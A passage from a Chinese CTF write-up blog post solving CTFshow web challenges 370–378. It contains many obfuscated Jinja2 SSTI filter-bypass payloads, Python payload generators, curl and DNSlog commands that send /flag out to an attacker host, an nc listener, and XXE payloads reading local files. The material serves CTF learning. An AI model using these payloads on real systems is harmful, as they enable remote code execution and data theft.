<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://965f672b-0325-41b2-af0b-2c72881896c3.chall.ctf.show:8080/?name=</span><br><span class="line">&#123;% set o=(dict(o=z)|join) %&#125;</span><br><span class="line">&#123;% set n=dict(n=z)|join %&#125;</span><br><span class="line">&#123;% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %&#125;</span><br><span class="line">&#123;% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %&#125;</span><br><span class="line">&#123;% set xiegang=(config|string|list).pop(-liushisi) %&#125;</span><br><span class="line">&#123;% set gang=(()|select|string|list).pop(ershisi) %&#125;</span><br><span class="line">&#123;% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %&#125;</span><br><span class="line">&#123;% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %&#125;</span><br><span class="line">&#123;% set gangfulaige=(xiegang,dict(flag=z)|join)|join %&#125;</span><br><span class="line">&#123;% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %&#125;</span><br></pre></td></tr></table></figure>



<p>直接把数字都给ban了，这里想到可以使用count进行计数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;%set k=dict(eeeeeeeee=a)|join|count%&#125;&#123;%set l=dict(eeeeeeee=a)|join|count%&#125;&#123;% set b=(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125;&#123;%print ((lipsum|attr(c))|attr(d)(e)).popen(i).read()%&#125;</span><br></pre></td></tr></table></figure>



<p>yu22x师傅的想法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set one=(dict(c=z)|join|length) %&#125;</span><br><span class="line">&#123;% set two=(dict(cc=z)|join|length) %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">GET：?name=</span><br><span class="line">&#123;% set c=(dict(e=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cc=(dict(ee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccc=(dict(eee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccc=(dict(eeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccc=(dict(eeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccc=(dict(eeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set coun=(cc~cccc)|int%&#125;</span><br><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(coun)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%&#125;</span><br><span class="line">&#123;%print(x.open(file).read())%&#125;</span><br><span class="line"> </span><br><span class="line">//count可以用length代替</span><br></pre></td></tr></table></figure>



<p>另外的解法</p>
<p>反弹shell，本地开启监听 nc -lvp 4567 等待反弹flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">cmd=&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://xxx:4567?p=`cat /flag`&quot;).read()&#x27;</span><br><span class="line">def fun1(s):</span><br><span class="line">	t=[]</span><br><span class="line">	for i in range(len(s)):</span><br><span class="line">		t.append(ord(s[i]))</span><br><span class="line">	k=&#x27;&#x27;</span><br><span class="line">	t=list(set(t))</span><br><span class="line">	for i in t:</span><br><span class="line">		k+=&#x27;&#123;% set &#x27;+&#x27;e&#x27;*(t.index(i)+1)+&#x27;=dict(&#x27;+&#x27;e&#x27;*i+&#x27;=a)|join|count%&#125;\n&#x27;</span><br><span class="line">	return k</span><br><span class="line">def fun2(s):</span><br><span class="line">	t=[]</span><br><span class="line">	for i in range(len(s)):</span><br><span class="line">		t.append(ord(s[i]))</span><br><span class="line">	t=list(set(t))</span><br><span class="line">	k=&#x27;&#x27;</span><br><span class="line">	for i in range(len(s)):</span><br><span class="line">		if i&lt;len(s)-1:</span><br><span class="line">			k+=&#x27;chr(&#x27;+&#x27;e&#x27;*(t.index(ord(s[i]))+1)+&#x27;)%2b&#x27;</span><br><span class="line">		else:</span><br><span class="line">			k+=&#x27;chr(&#x27;+&#x27;e&#x27;*(t.index(ord(s[i]))+1)+&#x27;)&#x27;</span><br><span class="line">	return k	</span><br><span class="line">url =&#x27;http://68f8cbd4-f452-4d69-b382-81eafed22f3f.chall.ctf.show/?name=&#x27;+fun1(cmd)+&#x27;&#x27;&#x27;</span><br><span class="line">&#123;% set coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;</span><br><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(coun)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set cmd=&#x27;&#x27;&#x27;+fun2(cmd)+&#x27;&#x27;&#x27;</span><br><span class="line">%&#125;</span><br><span class="line">&#123;%if x.eval(cmd)%&#125;</span><br><span class="line">abc</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure>

<h3 id="web-371"><a href="#web-371" class="headerlink" title="web-371"></a>web-371</h3><p>print被过滤，这里的话我们用反弹shell来做</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set c=(t|count)%&#125;</span><br><span class="line">&#123;% set cc=(dict(e=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccc=(dict(ee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccc=(dict(eee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccc=(dict(eeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccc=(dict(eeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccc=(dict(eeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccc=(dict(eeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccccc=(dict(eeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set coun=(ccc~ccccc)|int%&#125;</span><br><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(coun)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set cmd=</span><br><span class="line">%&#125;</span><br><span class="line">&#123;%if x.eval(cmd)%&#125;</span><br><span class="line">abc</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def aaa(t):</span><br><span class="line">    t=&#x27;(&#x27;+(int(t[:-1:])+1)*&#x27;c&#x27;+&#x27;~&#x27;+(int(t[-1])+1)*&#x27;c&#x27;+&#x27;)|int&#x27;</span><br><span class="line">    return t</span><br><span class="line">s=&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://xxx:7777?p=`cat /flag`&quot;).read()&#x27;</span><br><span class="line">def ccchr(s):</span><br><span class="line">    t=&#x27;&#x27;</span><br><span class="line">    for i in range(len(s)):</span><br><span class="line">        if i&lt;len(s)-1:</span><br><span class="line">            t+=&#x27;chr(&#x27;+aaa(str(ord(s[i])))+&#x27;)%2b&#x27;</span><br><span class="line">        else:</span><br><span class="line">            t+=&#x27;chr(&#x27;+aaa(str(ord(s[i])))+&#x27;)&#x27;</span><br><span class="line">    return t</span><br><span class="line">print(ccchr(s))</span><br></pre></td></tr></table></figure>



<p>feng师傅的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET：?name=</span><br><span class="line">&#123;% set c=dict(c=z)|join|length %&#125;</span><br><span class="line">&#123;% set cc=dict(cc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccc=dict(ccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccc=dict(cccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccc=dict(ccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccc=dict(cccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccccc=dict(ccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccccc=dict(cccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccccccc=dict(ccccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccccccc=dict(cccccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set space=(()|select|string|list).pop(ccccc*cc) %&#125;</span><br><span class="line">&#123;% set xhx=(()|select|string|list).pop(ccc*cccccccc) %&#125;</span><br><span class="line">&#123;% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %&#125;</span><br><span class="line">&#123;% set maohao=(config|string|list).pop(cc*ccccccc) %&#125;</span><br><span class="line">&#123;% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %&#125;</span><br><span class="line">&#123;% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set open=(lipsum|attr(globals)).get(builtins).open %&#125;</span><br><span class="line">&#123;% set result=open((xiegang,dict(flag=z)|join)|join).read() %&#125;</span><br><span class="line">&#123;% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,c,c,cccccccc,point,ccc,c,point,c,cccccc,cccccccc,point,c,ccccccccc,cccccccc,maohao,ccc,ccccccccc,c,c,c,xiegang,result)|join %&#125; </span><br><span class="line">&#123;% set ohs=dict(o=z,s=z)|join %&#125;</span><br><span class="line">&#123;% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %&#125;</span><br></pre></td></tr></table></figure>



<p>我看到有erR0Ratao师傅用外带数据的方法做的，蛮佩服的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `cat /flag`.vhthja.dnslog.cn</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;%set k=dict(eeeeeeeee=a)|join|count%&#125;&#123;%set l=dict(eeeeeeee=a)|join|count%&#125;&#123;%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;% set b=(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(vhthja=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;atao&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-372"><a href="#web-372" class="headerlink" title="web-372"></a>web-372</h3><p>过滤了count，可以用length替换</p>
<p>另外的思路是可以用全角数字代替正常数字(一般我们输入的数字都是半角)</p>
<p>半角转全角代码的python脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def half2full(half):</span><br><span class="line">    full = &#x27;&#x27;</span><br><span class="line">    for ch in half:</span><br><span class="line">        if ord(ch) in range(33, 127):</span><br><span class="line">            ch = chr(ord(ch) + 0xfee0)</span><br><span class="line">        elif ord(ch) == 32:</span><br><span class="line">            ch = chr(0x3000)</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">        full += ch</span><br><span class="line">    return full</span><br><span class="line">t=&#x27;&#x27;</span><br><span class="line">s=&quot;0123456789&quot;</span><br><span class="line">for i in s:</span><br><span class="line">    t+=&#x27;\&#x27;&#x27;+half2full(i)+&#x27;\&#x27;,&#x27;</span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure>

<p>全角’０’,’１’,’２’,’３’,’４’,’５’,’６’,’７’,’８’,’９’,</p>
<p>半角’0’,’1’,’2’,’3’,’4’,’5’,’6’,’7’,’8’,’9’</p>
<p>yu22x师傅用length代替count</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;%set k=dict(eeeeeeeee=a)|join|length%&#125;&#123;%set l=dict(eeeeeeee=a)|join|length%&#125;&#123;%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;% set b=(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(fgpozq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;atao&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>越看越乱了，真实场景应该没那么多需要fuzz的。思路是最重要的。</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="web-373"><a href="#web-373" class="headerlink" title="web-373"></a>web-373</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&#x27;php://input&#x27;):获取客户端输入的内容</span><br><span class="line">new DOMDocument():初始化XML解析器</span><br><span class="line">loadXML($xmlfile):加载客户端输入的XML内容</span><br><span class="line">simplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</span><br><span class="line">$xxe=$xml-&gt;xxe:获取SimpleXMLElement对象中的节点XXE</span><br><span class="line">echo $str:输出XXE内容。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;daigua&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/daigua&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-378"><a href="#web-378" class="headerlink" title="web-378"></a>web-378</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY  file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>中间的题目全部都先忽略了，还是因为没有VPS，可以选择自己买一个或者去本地复现漏洞。</p>
<p>给出 quan9i师傅的文章吧：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1716">https://tttang.com/archive/1716</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yake-daigua.top">yake-daigua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yake-daigua.top/2022/10/31/CTFSHOW_WP(254-378)/">https://yake-daigua.top/2022/10/31/CTFSHOW_WP(254-378)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yake-daigua.top" target="_blank">yake-daigua</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTFSHOW/">CTFSHOW</a></div><div class="post_share"><div class="social-share" data-image="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/31/2022%E5%B9%B410%E6%9C%88%E6%80%BB%E7%BB%93/"><img class="prev-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/445.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022年10月总结</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/31/CTFSHOW_WP(1-197)/"><img class="next-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">　CTFSHOW_WP(1-197)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/10/31/CTFSHOW_WP(1-197)/" title="　CTFSHOW_WP(1-197)"><img class="cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-31</div><div class="title">　CTFSHOW_WP(1-197)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="author-info__name">yake-daigua</div><div class="author-info__description">爱蜜莉雅,我好喜欢你</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yake-daigua"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div 